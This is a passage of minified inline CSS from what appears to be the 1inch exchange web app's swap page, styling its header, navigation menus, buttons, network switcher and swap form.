1200px){.header-button-wrap[_ngcontent-ipc-c297]{margin-right:16px}.header-account-button-wrap[_ngcontent-ipc-c297]{margin-right:16px}.logo-color[_ngcontent-ipc-c297]{margin-right:16px}}@media (max-width: 1080px){.header-nav-menu[_ngcontent-ipc-c297]{display:none}.header-burger-icon[_ngcontent-ipc-c297]{display:block}}@media (max-width: 900px){.header-logo-desktop[_ngcontent-ipc-c297]{display:none}.header-logo-mobile[_ngcontent-ipc-c297]{display:block}}@media (max-width: 520px){.header-claim-button-desktop[_ngcontent-ipc-c297]{display:none}.header-claim-button-mobile[_ngcontent-ipc-c297]{display:block;position:relative}.header-account-button-wrap[_ngcontent-ipc-c297]{position:fixed;flex-direction:row-reverse;right:0;left:0;bottom:0;z-index:10000;padding:14px 16px;margin-right:0;border-top:1px solid var(--1inch-border-01);background:var(--1inch-bg-01)}.header-settings-button[_ngcontent-ipc-c297]{order:-1;margin-left:10px;color:var(--1inch-bg-13)}.header-account-button-host[_ngcontent-ipc-c297]{align-self:center;justify-self:center}.version-update-button[_ngcontent-ipc-c297]{order:-2}}</style><style>.nav-menu[_ngcontent-ipc-c271]{display:flex;align-items:center}.nav-menu-item[_ngcontent-ipc-c271]{position:relative;margin-right:12px;border-radius:12px}.nav-menu-item[_ngcontent-ipc-c271]:hover, .nav-menu-item[_ngcontent-ipc-c271]:focus{cursor:default;background:var(--1inch-common-bg-01)}.nav-menu-item[_ngcontent-ipc-c271]:last-child{margin-right:0}.no-dropdown[_ngcontent-ipc-c271]{padding:4px 10px}.nav-menu-link-text[_ngcontent-ipc-c271]{text-decoration:none;font-size:16px;line-height:26px}.nav-menu-link-text[_ngcontent-ipc-c271] > *[_ngcontent-ipc-c271]{text-decoration:none;color:var(--1inch-link-01)}.nav-menu-link-text[_ngcontent-ipc-c271]:hover > *[_ngcontent-ipc-c271], .nav-menu-link-text[_ngcontent-ipc-c271]:focus > *[_ngcontent-ipc-c271]{color:var(--1inch-link-01-hover)}.nav-menu-link-text[_ngcontent-ipc-c271]:hover   .nav-menu-sub-item-subtext[_ngcontent-ipc-c271], .nav-menu-link-text[_ngcontent-ipc-c271]:focus   .nav-menu-sub-item-subtext[_ngcontent-ipc-c271]{opacity:1}.nav-menu-link-text-active[_ngcontent-ipc-c271]{color:var(--1inch-link-01-active)!important}.nav-menu-link-text-active[_ngcontent-ipc-c271]   .nav-menu-sub-item-subtext[_ngcontent-ipc-c271]{opacity:1}.nav-menu-item-disabled[_ngcontent-ipc-c271]{color:var(--1inch-link-01-disabled)}.nav-menu-item-disabled[_ngcontent-ipc-c271]   .nav-menu-item-title[_ngcontent-ipc-c271]{opacity:.4}.nav-menu-item-disabled[_ngcontent-ipc-c271]:hover, .nav-menu-item-disabled[_ngcontent-ipc-c271]:focus{background:unset}.nav-menu-item-disabled[_ngcontent-ipc-c271]:hover   .nav-menu-item-title[_ngcontent-ipc-c271], .nav-menu-item-disabled[_ngcontent-ipc-c271]:focus   .nav-menu-item-title[_ngcontent-ipc-c271]{color:var(--1inch-link-01-disabled)}.nav-menu-item-tooltip[_ngcontent-ipc-c271]{margin-top:-3px}.nav-menu-item-link-external[_ngcontent-ipc-c271]{position:relative}.nav-menu-item-link-external[_ngcontent-ipc-c271]:before, .nav-menu-item-link-external[_ngcontent-ipc-c271]:after{content:" ";border-radius:50%;position:absolute;background:var(--1inch-common-support-01)}.nav-menu-item-link-external[_ngcontent-ipc-c271]:before{width:8px;height:8px;top:-4px;right:-11px;opacity:.2}.nav-menu-item-link-external[_ngcontent-ipc-c271]:after{width:4px;height:4px;top:-2px;right:-9px;opacity:.5}@media (max-width: 1340px){.nav-menu-item[_ngcontent-ipc-c271]:last-child{display:none}}@media (max-width: 1300px){.nav-menu-item[_ngcontent-ipc-c271]{margin-right:0}}</style><style>mat-menu{display:none}.mat-menu-panel{min-width:112px;max-width:280px;overflow:auto;-webkit-overflow-scrolling:touch;max-height:calc(100vh - 48px);border-radius:4px;outline:0;min-height:64px}.mat-menu-panel.ng-animating{pointer-events:none}.cdk-high-contrast-active .mat-menu-panel{outline:solid 1px}.mat-menu-content:not(:empty){padding-top:8px;padding-bottom:8px}.mat-menu-item{-webkit-user-select:none;-moz-user-select:none;user-select:none;cursor:pointer;outline:none;border:none;-webkit-tap-highlight-color:transparent;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:block;line-height:48px;height:48px;padding:0 16px;text-align:left;text-decoration:none;max-width:100%;position:relative}.mat-menu-item::-moz-focus-inner{border:0}.mat-menu-item[disabled]{cursor:default}[dir=rtl] .mat-menu-item{text-align:right}.mat-menu-item .mat-icon{margin-right:16px;vertical-align:middle}.mat-menu-item .mat-icon svg{vertical-align:top}[dir=rtl] .mat-menu-item .mat-icon{margin-left:16px;margin-right:0}.mat-menu-item[disabled]{pointer-events:none}.cdk-high-contrast-active .mat-menu-item{margin-top:1px}.cdk-high-contrast-active .mat-menu-item.cdk-program-focused,.cdk-high-contrast-active .mat-menu-item.cdk-keyboard-focused,.cdk-high-contrast-active .mat-menu-item-highlighted{outline:dotted 1px}.mat-menu-item-submenu-trigger{padding-right:32px}[dir=rtl] .mat-menu-item-submenu-trigger{padding-right:16px;padding-left:32px}.mat-menu-submenu-icon{position:absolute;top:50%;right:16px;transform:translateY(-50%);width:5px;height:10px;fill:currentColor}[dir=rtl] .mat-menu-submenu-icon{right:auto;left:16px;transform:translateY(-50%) scaleX(-1)}.cdk-high-contrast-active .mat-menu-submenu-icon{fill:CanvasText}button.mat-menu-item{width:100%}.mat-menu-item .mat-menu-ripple{top:0;left:0;right:0;bottom:0;position:absolute;pointer-events:none}
+</style><style>.header-button[_ngcontent-ipc-c272]{display:flex;align-items:center;height:36px;padding:6px 10px 6px 8px;border-radius:12px;border:none;position:relative;font-size:16px}.header-button[_ngcontent-ipc-c272]   svg[_ngcontent-ipc-c272]{z-index:2}.header-button-without-icon[_ngcontent-ipc-c272]{padding:6px 8px}.header-button-without-icon[_ngcontent-ipc-c272]   .header-button-text[_ngcontent-ipc-c272]{margin-left:0}.header-button-without-text[_ngcontent-ipc-c272]{padding:0}.header-button-icon[_ngcontent-ipc-c272]{height:24px;width:24px}.header-button-text[_ngcontent-ipc-c272]{margin-left:8px;z-index:2}.header-button-blue[_ngcontent-ipc-c272]{background:var(--1inch-btn-gradient-bg-02);color:var(--1inch-common-text-01)}.header-button-purple[_ngcontent-ipc-c272]{background:var(--1inch-common-btn-gradient-bg-02);color:var(--1inch-common-text-01)}.header-button-red[_ngcontent-ipc-c272]{background:var(--1inch-common-btn-gradient-bg-04);color:var(--1inch-common-text-01)}.header-button-yellow[_ngcontent-ipc-c272]{background:var(--1inch-btn-gradient-bg-01);color:var(--1inch-common-text-01)}.header-button-smoke-blue[_ngcontent-ipc-c272]{background:var(--1inch-btn-gradient-bg-03);color:var(--1inch-common-text-01)}.header-button-light-red[_ngcontent-ipc-c272]{background:var(--1inch-btn-gradient-bg-05);color:var(--1inch-common-text-01)}.header-button-light-blue[_ngcontent-ipc-c272]{background:var(--1inch-common-btn-bg-07);color:var(--1inch-common-text-03)}.header-button-light-blue[_ngcontent-ipc-c272]:hover, .header-button-light-blue[_ngcontent-ipc-c272]:focus{background:var(--1inch-common-bg-03)}.header-button-gray[_ngcontent-ipc-c272]{background:var(--1inch-btn-bg-01);color:var(--1inch-text-01)}.header-button-gray[_ngcontent-ipc-c272]:hover, .header-button-gray[_ngcontent-ipc-c272]:focus{box-shadow:var(--1inch-shadow-06)}.header-button-green[_ngcontent-ipc-c272]{background:var(--1inch-btn-gradient-bg-04);color:var(--1inch-common-text-01)}.header-button-black-purple[_ngcontent-ipc-c272]{background:var(--1inch-gradient-02);color:var(--1inch-text-01)}.header-button-black-purple[_ngcontent-ipc-c272]:after{position:absolute;width:calc(100% - 2px);height:calc(100% - 2px);left:1px;content:"";border-radius:11px;z-index:1;background:var(--1inch-bg-02)}.header-button-blue[_ngcontent-ipc-c272]:hover, .header-button-blue[_ngcontent-ipc-c272]:focus, .header-button-purple[_ngcontent-ipc-c272]:hover, .header-button-purple[_ngcontent-ipc-c272]:focus, .header-button-yellow[_ngcontent-ipc-c272]:hover, .header-button-yellow[_ngcontent-ipc-c272]:focus, .header-button-red[_ngcontent-ipc-c272]:hover, .header-button-red[_ngcontent-ipc-c272]:focus, .header-button-smoke-blue[_ngcontent-ipc-c272]:hover, .header-button-smoke-blue[_ngcontent-ipc-c272]:focus, .header-button-light-red[_ngcontent-ipc-c272]:hover, .header-button-light-red[_ngcontent-ipc-c272]:focus, .header-button-green[_ngcontent-ipc-c272]:hover, .header-button-green[_ngcontent-ipc-c272]:focus{box-shadow:var(--1inch-shadow-05)}.header-button-white[_ngcontent-ipc-c272]{background:var(--1inch-common-btn-bg-02)}.header-button-arrow-icon[_ngcontent-ipc-c272]{margin-left:4px}.header-button-arrow-rotated-icon[_ngcontent-ipc-c272]{transform:rotate(180deg)}</style><style>.networks-wrap[_ngcontent-ipc-c273]{display:flex;position:relative;justify-content:flex-end}.switch-network-dropdown-wrap[_ngcontent-ipc-c273]{padding-top:8px;position:absolute;left:0;top:32px;z-index:1000}.switch-network-dropdown[_ngcontent-ipc-c273]{padding:16px 0;border-radius:16px;box-shadow:var(--1inch-shadow-01)}.switch-network-item-wrap[_ngcontent-ipc-c273]{display:contents}.switch-network-item[_ngcontent-ipc-c273]{display:flex;width:100%;align-items:center;cursor:pointer;white-space:nowrap;font-size:16px;text-decoration:none;padding:8px 16px;outline:none;box-shadow:none;border:0;color:var(--1inch-link-01)}.switch-network-item[_ngcontent-ipc-c273]:hover, .switch-network-item[_ngcontent-ipc-c273]:focus{color:var(--1inch-link-01-hover);background:var(--1inch-bg-03)}.switch-network-item-active[_ngcontent-ipc-c273]{color:var(--1inch-link-01-active)}.switch-network-item-icon[_ngcontent-ipc-c273]{width:24px;height:24px;margin-right:16px}.switch-network-item-light-icon[_ngcontent-ipc-c273]{width:24px;height:24px;margin-right:16px}.network-switch-mobile[_ngcontent-ipc-c273]{display:none}.network-switch-mobile-header[_ngcontent-ipc-c273]{display:none;padding:0 16px 16px;text-align:left;border-bottom:1px solid var(--1inch-border-01)}.network-switch-header-title[_ngcontent-ipc-c273]{font-size:20px;line-height:24px;color:var(--1inch-text-03)}.network-switch-close-icon[_ngcontent-ipc-c273]{position:absolute;right:6px;top:20px;border:none;color:var(--1inch-text-03)}.network-item-has-light-icon[_ngcontent-ipc-c273]   .switch-network-item-icon[_ngcontent-ipc-c273]{display:block}.network-item-has-light-icon[_ngcontent-ipc-c273]   .switch-network-item-light-icon[_ngcontent-ipc-c273]{display:none}.light-theme[_nghost-ipc-c273]   .network-item-has-light-icon[_ngcontent-ipc-c273]   .switch-network-item-icon[_ngcontent-ipc-c273], .light-theme   [_nghost-ipc-c273]   .network-item-has-light-icon[_ngcontent-ipc-c273]   .switch-network-item-icon[_ngcontent-ipc-c273]{display:none}.light-theme[_nghost-ipc-c273]   .network-item-has-light-icon[_ngcontent-ipc-c273]   .switch-network-item-light-icon[_ngcontent-ipc-c273], .light-theme   [_nghost-ipc-c273]   .network-item-has-light-icon[_ngcontent-ipc-c273]   .switch-network-item-light-icon[_ngcontent-ipc-c273]{display:block}@media (max-width: 720px){.network-switch-desktop[_ngcontent-ipc-c273]{display:none}.network-switch-mobile[_ngcontent-ipc-c273]{display:block}.switch-network-dropdown-wrap[_ngcontent-ipc-c273]{position:fixed;bottom:0;left:0;right:0;top:0;background:var(--1inch-bg-04);-webkit-backdrop-filter:blur(4px);backdrop-filter:blur(4px)}.networks-wrap[_ngcontent-ipc-c273]{z-index:10000}.switch-network-dropdown[_ngcontent-ipc-c273]{position:fixed;bottom:0;left:0;right:0;border-radius:24px 24px 0 0;padding-bottom:70px}.switch-network-item-wrap[_ngcontent-ipc-c273]{overflow:auto;display:block;max-height:calc(100vh - 140px)}.switch-network-item[_ngcontent-ipc-c273]{height:56px;margin-bottom:0}.network-switch-mobile-header[_ngcontent-ipc-c273]{display:block}.switch-network-item-icon[_ngcontent-ipc-c273]{width:40px;height:40px}.switch-network-item-light-icon[_ngcontent-ipc-c273]{width:40px;height:40px}.network-switch-close-icon[_ngcontent-ipc-c273]{right:10px;top:15px}}</style><style>[_nghost-ipc-c147]{position:-webkit-sticky;position:sticky;top:0;left:0;z-index:1;min-width:calc(100% - 1px);min-height:calc(100% - 1px);float:left;margin-right:calc(-100% + 1px);-webkit-margin-start:0;margin-inline-start:0;-webkit-margin-end:calc(-100% + 1px);margin-inline-end:calc(-100% + 1px);pointer-events:none}.bar[_ngcontent-ipc-c147]{position:absolute;right:0;bottom:0;pointer-events:auto}.bar_vertical[_ngcontent-ipc-c147]{top:0;width:.875rem}.bar_horizontal[_ngcontent-ipc-c147]{left:0;height:.875rem}.bar_has-horizontal[_ngcontent-ipc-c147]{bottom:.5rem}.bar_has-vertical[_ngcontent-ipc-c147]{right:.5rem}.thumb[_ngcontent-ipc-c147]{transition-duration:.15s;transition-timing-function:ease-in-out;position:absolute;border-radius:6.25rem;border:.25rem solid transparent;cursor:pointer;pointer-events:auto;background:var(--tui-text-01);background-clip:content-box;box-sizing:border-box;transition-property:width,height;opacity:.2}.thumb[_ngcontent-ipc-c147]:hover{opacity:.24}.thumb[_ngcontent-ipc-c147]:active{opacity:.48}[data-mode=onDark][_nghost-ipc-c147]   .thumb[_ngcontent-ipc-c147]{background-color:var(--tui-text-01-night)}.bar_vertical[_ngcontent-ipc-c147]   .thumb[_ngcontent-ipc-c147]{right:0;width:.75rem;min-height:1.25rem}.bar_vertical[_ngcontent-ipc-c147]   .thumb[_ngcontent-ipc-c147]:active, .bar_vertical[_ngcontent-ipc-c147]:hover   .thumb[_ngcontent-ipc-c147]{width:.875rem}.bar_horizontal[_ngcontent-ipc-c147]   .thumb[_ngcontent-ipc-c147]{bottom:0;height:.75rem;min-width:1.25rem}.bar_horizontal[_ngcontent-ipc-c147]   .thumb[_ngcontent-ipc-c147]:active, .bar_horizontal[_ngcontent-ipc-c147]:hover   .thumb[_ngcontent-ipc-c147]{height:.875rem}</style><style>[_nghost-ipc-c129]{position:fixed;left:0;bottom:0;width:100%;height:0}.dialog[_ngcontent-ipc-c129], .overlay[_ngcontent-ipc-c129]{position:fixed;top:0;left:0;right:0;bottom:0;display:flex;align-items:flex-start;outline:0;overflow:auto;overflow:overlay}.dialog[_ngcontent-ipc-c129]{bottom:auto;height:100%}.overlay[_ngcontent-ipc-c129]{height:100vh;pointer-events:none;touch-action:none;opacity:0;letter-spacing:normal;transition:opacity var(--tui-duration),letter-spacing 10ms;background:rgba(0,0,0,.75)}.overlay_visible[_ngcontent-ipc-c129]{opacity:1;letter-spacing:1px}.dialog[_ngcontent-ipc-c129]:last-of-type{z-index:1}</style><style>[_nghost-ipc-c270]{display:inline-block}[_nghost-ipc-c270]:hover   .nav-menu-item-title[_ngcontent-ipc-c270], [_nghost-ipc-c270]:hover   .nav-menu-item-arrow[_ngcontent-ipc-c270], [_nghost-ipc-c270]:focus   .nav-menu-item-title[_ngcontent-ipc-c270], [_nghost-ipc-c270]:focus   .nav-menu-item-arrow[_ngcontent-ipc-c270]{color:var(--1inch-text-01)}.nav-menu-dropdown[_ngcontent-ipc-c270]{width:100%;padding:4px 10px}.nav-menu-dropdown.active[_ngcontent-ipc-c270]   .nav-menu-item-title[_ngcontent-ipc-c270], .nav-menu-dropdown.active[_ngcontent-ipc-c270]   svg[_ngcontent-ipc-c270]{color:var(--1inch-link-01-hover)}.nav-menu-item-arrow[_ngcontent-ipc-c270]{color:var(--1inch-link-01)}.nav-menu-item-arrow.sub-dropdown-arrow[_ngcontent-ipc-c270]{transform:rotate(-100grad);margin-top:-2px}.nav-menu-sub-item-disabled[_ngcontent-ipc-c270]{opacity:.4;color:var(--1inch-link-01-disabled)}.nav-menu-sub-item-subtext[_ngcontent-ipc-c270]{font-size:13px;line-height:16px;opacity:.55}.nav-menu-item-has-light-icon[_ngcontent-ipc-c270]   svg[_ngcontent-ipc-c270]:last-of-type{display:none}.nav-menu-item-link-icon[_ngcontent-ipc-c270]{margin-right:16px}.nav-menu-link-text[_ngcontent-ipc-c270]{text-decoration:none;font-size:16px;line-height:26px}.nav-menu-link-text[_ngcontent-ipc-c270] > *[_ngcontent-ipc-c270]{text-decoration:none;color:var(--1inch-link-01)}.nav-menu-link-text[_ngcontent-ipc-c270]:hover > *[_ngcontent-ipc-c270], .nav-menu-link-text[_ngcontent-ipc-c270]:focus > *[_ngcontent-ipc-c270]{color:var(--1inch-link-01-hover)}.nav-menu-link-text[_ngcontent-ipc-c270]:hover   .nav-menu-sub-item-subtext[_ngcontent-ipc-c270], .nav-menu-link-text[_ngcontent-ipc-c270]:focus   .nav-menu-sub-item-subtext[_ngcontent-ipc-c270]{opacity:1}.nav-menu-link-text-active[_ngcontent-ipc-c270]{color:var(--1inch-link-01-active)!important}.nav-menu-link-text-active[_ngcontent-ipc-c270]   .nav-menu-sub-item-subtext[_ngcontent-ipc-c270]{opacity:1}.nav-menu-item-title[_ngcontent-ipc-c270]{font-size:16px;line-height:26px;margin-right:4px;color:var(--1inch-link-01)}.nav-menu-sub-item[_ngcontent-ipc-c270]{display:flex;align-items:center;padding:8px 16px}.nav-menu-sub-item[_ngcontent-ipc-c270]:hover, .nav-menu-sub-item[_ngcontent-ipc-c270]:focus{background:var(--1inch-bg-03)}.nav-menu-sub-item[_ngcontent-ipc-c270]:hover   .nav-menu-sub-item-subtext[_ngcontent-ipc-c270], .nav-menu-sub-item[_ngcontent-ipc-c270]:focus   .nav-menu-sub-item-subtext[_ngcontent-ipc-c270]{opacity:1}.light-theme[_nghost-ipc-c270]   .nav-menu-item-has-light-icon[_ngcontent-ipc-c270]   svg[_ngcontent-ipc-c270]:first-of-type, .light-theme   [_nghost-ipc-c270]   .nav-menu-item-has-light-icon[_ngcontent-ipc-c270]   svg[_ngcontent-ipc-c270]:first-of-type{display:none}.light-theme[_nghost-ipc-c270]   .nav-menu-item-has-light-icon[_ngcontent-ipc-c270]   svg[_ngcontent-ipc-c270]:last-of-type, .light-theme   [_nghost-ipc-c270]   .nav-menu-item-has-light-icon[_ngcontent-ipc-c270]   svg[_ngcontent-ipc-c270]:last-of-type{display:block}.nav-menu-item-tooltip[_ngcontent-ipc-c270]{margin-top:-3px}</style><style>[_nghost-ipc-c178]{display:inline-flex}.wrapper[_ngcontent-ipc-c178]{border-radius:inherit;height:inherit;flex:1 1 auto;width:100%}.content[_ngcontent-ipc-c178]{display:flex;flex-direction:column;min-height:0}</style><style>.mat-expansion-panel{box-sizing:content-box;display:block;margin:0;border-radius:4px;overflow:hidden;transition:margin 225ms cubic-bezier(0.4, 0, 0.2, 1),box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);position:relative}.mat-accordion .mat-expansion-panel:not(.mat-expanded),.mat-accordion .mat-expansion-panel:not(.mat-expansion-panel-spacing){border-radius:0}.mat-accordion .mat-expansion-panel:first-of-type{border-top-right-radius:4px;border-top-left-radius:4px}.mat-accordion .mat-expansion-panel:last-of-type{border-bottom-right-radius:4px;border-bottom-left-radius:4px}.cdk-high-contrast-active .mat-expansion-panel{outline:solid 1px}.mat-expansion-panel.ng-animate-disabled,.ng-animate-disabled .mat-expansion-panel,.mat-expansion-panel._mat-animation-noopable{transition:none}.mat-expansion-panel-content{display:flex;flex-direction:column;overflow:visible}.mat-expansion-panel-body{padding:0 24px 16px}.mat-expansion-panel-spacing{margin:16px 0}.mat-accordion>.mat-expansion-panel-spacing:first-child,.mat-accordion>*:first-child:not(.mat-expansion-panel) .mat-expansion-panel-spacing{margin-top:0}.mat-accordion>.mat-expansion-panel-spacing:last-child,.mat-accordion>*:last-child:not(.mat-expansion-panel) .mat-expansion-panel-spacing{margin-bottom:0}.mat-action-row{border-top-style:solid;border-top-width:1px;display:flex;flex-direction:row;justify-content:flex-end;padding:16px 8px 16px 24px}.mat-action-row button.mat-button-base,.mat-action-row button.mat-mdc-button-base{margin-left:8px}[dir=rtl] .mat-action-row button.mat-button-base,[dir=rtl] .mat-action-row button.mat-mdc-button-base{margin-left:0;margin-right:8px}
+</style><style>.mat-expansion-panel-header{display:flex;flex-direction:row;align-items:center;padding:0 24px;border-radius:inherit;transition:height 225ms cubic-bezier(0.4, 0, 0.2, 1)}.mat-expansion-panel-header._mat-animation-noopable{transition:none}.mat-expansion-panel-header:focus,.mat-expansion-panel-header:hover{outline:none}.mat-expansion-panel-header.mat-expanded:focus,.mat-expansion-panel-header.mat-expanded:hover{background:inherit}.mat-expansion-panel-header:not([aria-disabled=true]){cursor:pointer}.mat-expansion-panel-header.mat-expansion-toggle-indicator-before{flex-direction:row-reverse}.mat-expansion-panel-header.mat-expansion-toggle-indicator-before .mat-expansion-indicator{margin:0 16px 0 0}[dir=rtl] .mat-expansion-panel-header.mat-expansion-toggle-indicator-before .mat-expansion-indicator{margin:0 0 0 16px}.mat-content{display:flex;flex:1;flex-direction:row;overflow:hidden}.mat-expansion-panel-header-title,.mat-expansion-panel-header-description{display:flex;flex-grow:1;margin-right:16px;align-items:center}[dir=rtl] .mat-expansion-panel-header-title,[dir=rtl] .mat-expansion-panel-header-description{margin-right:0;margin-left:16px}.mat-expansion-panel-header-description{flex-grow:2}.mat-expansion-indicator::after{border-style:solid;border-width:0 2px 2px 0;content:"";display:inline-block;padding:3px;transform:rotate(45deg);vertical-align:middle}.cdk-high-contrast-active .mat-expansion-panel .mat-expansion-panel-header.cdk-keyboard-focused:not([aria-disabled=true])::before,.cdk-high-contrast-active .mat-expansion-panel .mat-expansion-panel-header.cdk-program-focused:not([aria-disabled=true])::before,.cdk-high-contrast-active .mat-expansion-panel:not(.mat-expanded) .mat-expansion-panel-header:hover:not([aria-disabled=true])::before{top:0;left:0;right:0;bottom:0;position:absolute;box-sizing:border-box;pointer-events:none;border:3px solid;border-radius:4px;content:""}.cdk-high-contrast-active .mat-expansion-panel-content{border-top:1px solid;border-top-left-radius:0;border-top-right-radius:0}
+</style><style>[_nghost-ipc-c335]{display:block;padding-bottom:120px;margin-bottom:60px}@media (max-width: 520px){[_nghost-ipc-c335]{padding-bottom:190px}[_nghost-ipc-c335]   .embedded-swap[_nghost-ipc-c335], .embedded-swap   [_nghost-ipc-c335]{padding-bottom:0}}@media (max-width: 418px){[_nghost-ipc-c335]{margin:0 -16px}}.current-block-number[_ngcontent-ipc-c335]{position:fixed;right:40px;bottom:30px}</style><style>@charset "UTF-8";[_nghost-ipc-c334]   a[_ngcontent-ipc-c334]{font-size:13px;color:var(--1inch-common-text-04)}[_nghost-ipc-c334]   a[_ngcontent-ipc-c334]:hover{color:var(--1inch-warning-text-03);text-decoration:none;transition:.2s}[_nghost-ipc-c334]   a[_ngcontent-ipc-c334]:before{content:"\2022";color:var(--1inch-warning-text-03);font-size:26px;font-weight:bold;margin-right:8px;height:10px;vertical-align:middle}@media (max-width: 520px){[_nghost-ipc-c334]{display:none}}</style><style>[_nghost-ipc-c353]{display:block;margin:0 auto;width:418px;min-height:100px;background-color:var(--1inch-bg-02);box-shadow:var(--1inch-shadow-04);border-radius:24px;padding:16px;max-width:100%}</style><style>[_nghost-ipc-c366]{display:block;position:relative}.swap-form-header[_ngcontent-ipc-c366]{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;margin-top:-6px}.swap-form-actions[_ngcontent-ipc-c366]{display:flex;margin-right:-4px}.swap-form-actions[_ngcontent-ipc-c366]   svg[_ngcontent-ipc-c366]{color:var(--1inch-text-01)}.quote-info[_ngcontent-ipc-c366]{position:absolute;width:100%;top:106%}.refresh-icon[_ngcontent-ipc-c366]{margin-right:12px}.settings-icon[_ngcontent-ipc-c366]{padding:6px}.refresh-icon[_ngcontent-ipc-c366], .settings-icon[_ngcontent-ipc-c366]{cursor:pointer;width:36px;height:36px;border-radius:12px;transition:background .2s}.refresh-icon[_ngcontent-ipc-c366]:hover, .refresh-icon[_ngcontent-ipc-c366]:focus, .settings-icon[_ngcontent-ipc-c366]:hover, .settings-icon[_ngcontent-ipc-c366]:focus{background:var(--1inch-common-btn-bg-03)}.set-max-native-tooltip[_ngcontent-ipc-c366]{cursor:pointer;margin:2px 0 0 8px;color:var(--1inch-common-text-02)}.set-max-native-tooltip-text[_ngcontent-ipc-c366]{max-width:270px;font-size:13px;line-height:16px}@media (max-width: 418px){.quote-info[_ngcontent-ipc-c366]{bottom:-85px}}</style><style>[_nghost-ipc-c355]{position:relative}.trade-menu-item[_ngcontent-ipc-c355]{position:relative;font-size:16px;line-height:20px;text-decoration:none;font-weight:bold;color:var(--1inch-common-text-02);margin-right:24px;padding-bottom:4px;cursor:pointer}.trade-menu-item[_ngcontent-ipc-c355]:hover, .trade-menu-item[_ngcontent-ipc-c355]:focus{color:var(--link-blue)}.trade-menu-item__active[_ngcontent-ipc-c355]{color:var(--1inch-text-01)!important}.trade-menu-item__additional[_ngcontent-ipc-c355]{margin-right:34px}.highlight-active[_nghost-ipc-c355]   .trade-menu-item__active[_ngcontent-ipc-c355]{border-bottom:2px solid var(--link-blue)}  tui-data-list{padding:0!important}.swap-link[_ngcontent-ipc-c355]{text-decoration:none;color:var(--1inch-text-01)!important}.arrow-icon[_ngcontent-ipc-c355]{margin-left:6px}</style><style>.arrow-loading[_ngcontent-ipc-c356]{color:var(--1inch-text-01)}.arrow-loading[_ngcontent-ipc-c356]   .background-path[_ngcontent-ipc-c356]{fill:var(--1inch-border-08)}</style><style>[_nghost-ipc-c357]{display:block;width:100%;padding:16px;border-radius:16px;background-color:var(--1inch-bg-07);box-shadow:var(--1inch-shadow-03)}.transparent[_nghost-ipc-c357]{background:transparent;border:1px solid var(--1inch-border-02)}.source-layout-row[_ngcontent-ipc-c357]{display:flex;flex-direction:row;justify-items:baseline;justify-content:space-between;align-items:center}.source-layout-row[_ngcontent-ipc-c357] > div[_ngcontent-ipc-c357]:last-child{text-align:right}.source-layout-row[_ngcontent-ipc-c357]:first-child{margin-bottom:12px}.source-layout-row[_ngcontent-ipc-c357]:nth-child(2){margin:15px 0}.source-layout-row.compact[_ngcontent-ipc-c357]{margin-top:20px!important;margin-bottom:4px!important}.source-layout-row.view[_ngcontent-ipc-c357]{margin-top:20px;margin-bottom:0;height:16px}.source-layout-row.single-row[_ngcontent-ipc-c357]{margin-bottom:0!important}.source-layout-title[_ngcontent-ipc-c357], .source-token-balance[_ngcontent-ipc-c357]{font-size:13px;color:var(--1inch-common-text-02)}.source-layout-title[_ngcontent-ipc-c357]:hover, .source-layout-title[_ngcontent-ipc-c357]:focus{text-decoration:none;color:var(--1inch-text-03);transition:.2s}.source-token-set-max[_ngcontent-ipc-c357]{color:var(--1inch-common-text-03)}.source-token-set-max[_ngcontent-ipc-c357]:hover, .source-token-set-max[_ngcontent-ipc-c357]:focus{opacity:.75;transition:.2s}.select-source-token[_ngcontent-ipc-c357]{text-decoration:none;padding:6px 5px 6px 8px;margin-left:-8px;border-radius:12px}.select-source-token[_ngcontent-ipc-c357]:hover, .select-source-token[_ngcontent-ipc-c357]:focus{background:var(--1inch-bg-02)}.source-token-amount-input-container[_ngcontent-ipc-c357]{width:100%;width:-webkit-fill-available;display:flex;align-items:center;justify-content:flex-end}.set-max-native-tooltip[_ngcontent-ipc-c357]{cursor:pointer;margin:2px 0 0 8px;color:var(--1inch-common-text-02)}.set-max-native-tooltip-text[_ngcontent-ipc-c357]{max-width:270px;font-size:13px;line-height:16px}.token-name[_ngcontent-ipc-c357]{white-space:nowrap;font-size:13px;overflow:hidden;text-overflow:ellipsis;margin-right:4px;color:var(--1inch-text-04)}.source-token-amount-usd-price[_ngcontent-ipc-c357]{color:var(--1inch-text-04)}.select-source-token-lock-wrap[_ngcontent-ipc-c357]{display:flex;align-items:center}.select-source-token-lock[_ngcontent-ipc-c357]{margin-left:4px;color:var(--1inch-warning-text-02)}.amount[_ngcontent-ipc-c357]{font-size:20px;line-height:24px}</style><style>[_nghost-ipc-c341]{display:block}.rotatable[_nghost-ipc-c341]   .swap-direction-arrow[_ngcontent-ipc-c341]{cursor:pointer}.rotatable[_nghost-ipc-c341]   .swap-direction-arrow[_ngcontent-ipc-c341]:hover{transform:rotate(180deg)}.rotatable[_nghost-ipc-c341]   .swap-direction-arrow[_ngcontent-ipc-c341]:hover   svg[_ngcontent-ipc-c341]{opacity:.75}.swap-direction-arrow[_ngcontent-ipc-c341]{display:inline-block;width:24px;height:24px;line-height:24px;border-radius:50%;background-color:var(--1inch-btn-bg-01);box-shadow:var(--1inch-btn-shadow-02);text-align:center;color:var(--1inch-icon-color-01);transition:transform .3s}.swap-direction-arrow-container[_ngcontent-ipc-c341]{text-align:center;margin:-7px 0}</style><style>[_nghost-ipc-c360]{display:block;border:1px solid var(--1inch-border-05);border-radius:16px;padding:16px}@media (max-width: 418px){[_nghost-ipc-c360]{padding:0;border:none}}.destination-token-container[_ngcontent-ipc-c360]{margin-bottom:24px;color:var(--1inch-common-text-02)}@media (max-width: 418px){.destination-token-container[_ngcontent-ipc-c360]{border-radius:16px 16px 0 0;padding:16px;border:1px solid var(--1inch-border-05);border-bottom:0;margin-bottom:8px}}.destination-top-row[_ngcontent-ipc-c360]{display:flex;justify-content:space-between;font-size:13px;margin-bottom:12px}.destination-top-row-title[_ngcontent-ipc-c360]{color:var(--1inch-common-text-02)}.destination-top-row-title[_ngcontent-ipc-c360]:hover, .destination-top-row-title[_ngcontent-ipc-c360]:focus{text-decoration:none;color:var(--1inch-text-03);transition:.2s}.destination-token-balance[_ngcontent-ipc-c360]{text-align:right}.select-destination-token[_ngcontent-ipc-c360]{display:inline-block;text-decoration:none;padding:6px 6px 6px 9px;margin-left:-9px;border-radius:12px}.select-destination-token[_ngcontent-ipc-c360]:not([disabled=true]):hover, 